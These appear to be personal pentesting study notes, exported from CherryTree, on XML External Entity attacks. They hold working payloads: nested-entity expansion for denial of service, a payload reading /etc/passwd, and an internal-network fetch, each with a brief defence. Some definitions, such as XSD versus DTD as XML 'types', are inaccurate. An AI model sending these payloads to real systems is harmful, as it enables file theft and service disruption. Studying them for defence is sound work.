<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>XML External Entity Attack</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># XML External Entity Attack</h1></strong><br /><strong>Links</strong><br />• <a href="https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/">https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/</a> - this page is basically ripped from here<br />• <a href="https://portswigger.net/web-security/xxe">https://portswigger.net/web-security/xxe</a><br />• <a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe</a><br /><br />An XML External Entity (XXE) attack is where you define an XML entity which (most commonly) points to a file on the target system.<br />If the XML parser is configured to parse external entities, it will process the file and print it out.<br /><br />XXE vulnerabilities only occur in the DTD (Docuemnt Type Definition) format.<br /><br /><strong>Internal Entity</strong><br />If an entity is declared within a DTD file it is called as internal entity.<br />Syntax: <code>&lt;!ENTITY entity_name &quot;entity_value&quot;&gt;</code><br /><br /><strong>External Entity</strong><br />If an entity is declared outside a DTD file it is called as external entity. Identified by <code>SYSTEM</code>.<br />Syntax: <code>&lt;!ENTITY entity_name SYSTEM &quot;entity_value&quot;&gt;</code><br /><br /><strong><h2>## What is XML?</h2></strong><br />XML is a data format.<br />It&#39;s used in everything from web services (XML-RPC, SOAP, REST) through to documents (XML, HTML, DOCX) through to image files (SVG, EXIF data).<br />To interpret XML data, applications need an XML parser.<br />When XML data is submitted, the parser verifies whether the data is of the correct type and, if it is, processes it.<br /><br />XML documents can be 1 of 2 types:<br />• XML Scheme Definition (XSD)<br />• Docuemnt Type Definitions (DTD)<br />   ◇ XXE vulnerabilities only occur in the DTD format<br /><br /><strong><h3>### XML Request &amp; Parsed Output</h3></strong><br />Here&#39;s an example of an XML request and the output that the XML parser produces.<br /><br />Request<br /><div class="codebox"><div class="codebox">POST&nbsp;http://example.com/xml&nbsp;HTTP/1.1<br />&lt;foo&gt;<br />Hello&nbsp;World<br />&lt;/foo&gt;</div></div><br /><br />Response<br /><div class="codebox"><div class="codebox">HTTP/1.0&nbsp;200&nbsp;OK<br /><br />Hello&nbsp;World</div></div><br /><br /><strong><h2>## What is XXE Injection?</h2></strong><br />XXE Injection is where you inject code into a XML DTD file.<br />Typically this is done within <code>ENTITY</code>s which define aliases for values. Think of them like variables.<br /><br />In the example below:<br />• A DTD (document type definition) is created call <code>foo</code>.<br />• This DOCTYPE has an entity called <code>bar</code>, which is an alias for “world”.<br />• Whenever <code>&amp;bar</code> is used, the XML parser replaces <code>&amp;bar</code> with the entity &quot;world&quot;.<br />• This entity - <code>&amp;bar</code> - is where you inject your attack/code.<br /><br /><strong>Request</strong><br /><div class="codebox"><div class="codebox">POST&nbsp;http://example.com/xml&nbsp;HTTP/1.1<br /><br />&lt;?xml&nbsp;version=&quot;1.0&quot;&nbsp;encoding=&quot;ISO-8859-1&quot;?&gt;<br />&lt;!DOCTYPE&nbsp;foo&nbsp;[<br />&nbsp;&nbsp;&lt;!ELEMENT&nbsp;foo&nbsp;ANY&gt;<br />&nbsp;&nbsp;&lt;!ENTITY&nbsp;bar&nbsp;&quot;World&quot;&gt;<br />]&gt;<br />&lt;foo&gt;<br />&nbsp;&nbsp;Hello&nbsp;&amp;bar;<br />&lt;/foo&gt;</div></div><br /><br /><strong>Response</strong><br /><div class="codebox"><div class="codebox">HTTP/1.0&nbsp;200&nbsp;OK<br />&nbsp;<br />Hello&nbsp;World</div></div><br /><br /><strong><h2>## Attacks</h2></strong><br /><strong><h3>### DoS - Billion Laughs attack</h3></strong><br /><a href="https://en.wikipedia.org/wiki/Billion_laughs_attack">https://en.wikipedia.org/wiki/Billion_laughs_attack</a><br /><br />You can cause a denial of service by embedding entities within entities within entities to overload the XML parser.<br /><br /><strong>Request</strong><code><br /></code><div class="codebox"><div class="codebox">&lt;?xml&nbsp;version=&quot;1.0&quot;&nbsp;encoding=&quot;ISO-8859-1&quot;?&gt;&nbsp;<br />&lt;!DOCTYPE&nbsp;foo&nbsp;[<br />&nbsp;&nbsp;&lt;!ELEMENT&nbsp;foo&nbsp;ANY&gt;<br />&nbsp;&nbsp;&lt;!ENTITY&nbsp;bar&nbsp;&quot;World&nbsp;&quot;&gt;<br />&nbsp;&nbsp;&lt;!ENTITY&nbsp;t1&nbsp;&quot;&amp;bar;&amp;bar;&quot;&gt;<br />&nbsp;&nbsp;&lt;!ENTITY&nbsp;t2&nbsp;&quot;&amp;t1;&amp;t1;&amp;t1;&amp;t1;&quot;&gt;<br />&nbsp;&nbsp;&lt;!ENTITY&nbsp;t3&nbsp;&quot;&amp;t2;&amp;t2;&amp;t2;&amp;t2;&amp;t2;&quot;&gt;<br />]&gt;<br />&lt;foo&gt;<br />&nbsp;&nbsp;Hello&nbsp;&amp;t3;<br />&lt;/foo&gt;</div></div><br /><br /><strong>Reponse</strong><br /><div class="codebox"><div class="codebox">HTTP/1.0&nbsp;200&nbsp;OK<br />&nbsp;<br />Hello&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World&nbsp;World</div></div><code><br /></code><br /><strong>#### Defense</strong><br />Some XML parses limit the amount of memory they can use, which prevents a DoS from happening.<br /><br /><strong><h3>### Read External Entities - files/web pages behind firewall</h3></strong><br />XML entities don&#39;t have to come from within the document.<br />If the XML parser is configured to process external entities (by default most are), you can define an external entity (e.g. a file on the system, a web page on the internal firewall) and the XML parser will print out the contents of the file.<br /><br /><strong>Examples</strong><br />• <em>hackthebox DevOops</em><br /><br /><strong>#### Read File Example</strong><br />Request<br /><div class="codebox"><div class="codebox">POST&nbsp;http://example.com/xml&nbsp;HTTP/1.1<br />&lt;?xml&nbsp;version=&quot;1.0&quot;&nbsp;encoding=&quot;ISO-8859-1&quot;?&gt;&nbsp;<br />&lt;!DOCTYPE&nbsp;foo&nbsp;[<br />&nbsp;&nbsp;&lt;!ELEMENT&nbsp;foo&nbsp;ANY&gt;<br />&nbsp;&nbsp;&lt;!ENTITY&nbsp;xxe&nbsp;SYSTEM&nbsp;&quot;file:///etc/passwd&quot;&gt;<br />]&gt;<br />&lt;foo&gt;<br />&nbsp;&nbsp;&amp;xxe;<br />&lt;/foo&gt;</div></div><br /><br />Response<br /><div class="codebox"><div class="codebox">HTTP/1.0&nbsp;200&nbsp;OK<br />&nbsp;<br />root:x:0:0:root:/root:/bin/bash<br />daemon:x:1:1:daemon:/usr/sbin:/bin/sh&nbsp;<br />bin:x:2:2:bin:/bin:/bin/sh<br />sys:x:3:3:sys:/dev:/bin/sh&nbsp;<br />(...)</div></div><br /><br /><strong>#### Read Web Pages Example</strong><br />Request<br /><div class="codebox"><div class="codebox">POST&nbsp;http://example.com/xml&nbsp;HTTP/1.1<br />&lt;?xml&nbsp;version=&quot;1.0&quot;&nbsp;encoding=&quot;ISO-8859-1&quot;?&gt;&nbsp;<br />&lt;!DOCTYPE&nbsp;foo&nbsp;[<br />&nbsp;&nbsp;&lt;!ELEMENT&nbsp;foo&nbsp;ANY&gt;<br />&nbsp;&nbsp;&lt;!ENTITY&nbsp;xxe&nbsp;SYSTEM&nbsp;&quot;http://192.168.0.1/secret.txt&quot;&gt;<br />]&gt;<br />&lt;foo&gt;<br />&nbsp;&nbsp;&amp;xxe;<br />&lt;/foo&gt;</div></div><br /><br />Response<br /><div class="codebox"><div class="codebox">HTTP/1.0&nbsp;200&nbsp;OK<br />&nbsp;<br />Hello,&nbsp;I&#39;m&nbsp;a&nbsp;file&nbsp;on&nbsp;the&nbsp;local&nbsp;network&nbsp;(behind&nbsp;the&nbsp;firewall)</div></div><br /><br /><strong>#### Defense</strong><br />Disable the XML parser from processing external entities.<br /><br /><code><br /></code><br /></div>
</body>
</html>
